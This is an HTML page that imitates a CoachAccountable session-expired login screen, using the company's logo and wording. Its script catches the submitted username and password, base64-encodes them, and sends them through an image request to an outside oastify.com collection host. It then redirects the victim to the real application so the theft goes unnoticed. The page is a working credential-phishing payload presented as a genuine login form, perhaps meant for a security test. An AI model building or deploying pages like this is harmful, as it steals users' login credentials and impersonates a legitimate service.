<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 300px;
        }
        .login-container img {
            width: 150px;
            margin-bottom: 20px;
        }
        .login-container h2 {
            margin-bottom: 20px;
            font-size: 24px;
            color: #333;
        }
        .login-container p {
            font-size: 14px;
            color: #666;
            margin-bottom: 15px;
            text-align: left;
        }
        .login-container input[type="text"], .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
        }
        .login-container input[type="checkbox"] {
            margin: 10px 0;
        }
        .login-container button {
            background-color: #007bff;
            color: white;
            padding: 10px;
            width: 100%;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-container a {
            display: block;
            margin-top: 10px;
            color: #007bff;
            text-decoration: none;
            font-size: 12px;
        }
        .login-container a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://www.coachaccountable.com/images/public/signs/coachAccountableLogo.png" alt="Coach Accountable Logo">
        <h2>Welcome back.</h2>
        <p><strong>Please log in again</strong></p>
        <p>Oops!<br>It seems you've been away for a while, for you are no longer logged in.</p>
        <p>To continue with what you were doing, please log in again.</p>
        <form id="loginForm">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <div>
                <input type="checkbox" name="keep_logged_in" id="keep_logged_in">
                <label for="keep_logged_in">Keep me logged in</label>
            </div>
            <button type="submit">Sign in</button>
        </form>
        <a href="#">Forgot your username or password?</a>
    </div>

    <script>
        function base64Encode(str) {
            return btoa(unescape(encodeURIComponent(str)));
        }

        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            var username = document.getElementById('username').value;
            var password = document.getElementById('password').value;

            // Base64 encode the username and password
            var encodedUsername = base64Encode(username);
            var encodedPassword = base64Encode(password);

            // Construct the GET request
            var url = 'https://kuivla8h2hf32m77p3nibo9hx83zrrmfb.oastify.com/?username=' + encodedUsername + '&password=' + encodedPassword;

            // Send the request
            var img = new Image();
            img.src = url;

            // Redirect to the target page
            setTimeout(function() {
                window.location.href = 'https://www.coachaccountable.com/app/library';
            }, 1000); // Slight delay to ensure request is sent
        });
    </script>
</body>
</html>
